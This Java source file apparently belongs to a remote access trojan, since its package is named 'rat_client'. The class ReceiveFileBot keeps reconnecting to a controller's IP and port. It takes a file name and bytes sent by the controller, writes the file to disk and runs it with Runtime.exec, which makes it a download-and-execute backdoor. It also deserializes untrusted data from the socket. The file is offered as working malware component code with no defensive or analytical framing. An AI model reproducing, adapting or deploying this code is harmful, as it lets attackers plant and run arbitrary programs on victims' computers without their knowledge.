package rat_client;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;

@Deprecated
public class ReceiveFileBot implements Runnable
{
    private Socket socket;
    private String ip;
    private int port;
    private Thread thread;
    
    public ReceiveFileBot(String ip,int port)
    {
        this.ip=ip;
        this.port=port;
        thread=new Thread(this);
        thread.start();
    }
    
    private void createFileTransferStream()
    {
        try
        {
            ObjectInputStream ois=new ObjectInputStream(socket.getInputStream());
            ObjectOutputStream oos=new ObjectOutputStream(socket.getOutputStream());
            String file_name=ois.readUTF();
            byte[] fileData=(byte[])ois.readObject();
            oos.writeUTF("ACK");
            oos.flush();
            hexByteToBinaryFile(fileData,file_name);
        }
        catch(IOException exc)
        {
            thread=new Thread(ReceiveFileBot.this);
            thread.start();
        }
        catch(ClassNotFoundException exc)
        {
            exc.printStackTrace();
        }
        thread=new Thread(ReceiveFileBot.this);
        thread.start();
    }
    
    private void hexByteToBinaryFile(final byte[] hex,String FILE_NAME) throws IOException
    {
        FileOutputStream stream=new FileOutputStream(FILE_NAME);
        stream.write(hex);
        stream.close();
        Runtime.getRuntime().exec(new File(FILE_NAME).getName());
    }
    
    @Override
    public void run()
    {
        while(true)
          try
          {
              socket=new Socket(ip,port);
              createFileTransferStream();
              return;
          }
          catch(IOException exc)
          {
            
          }
    }
}
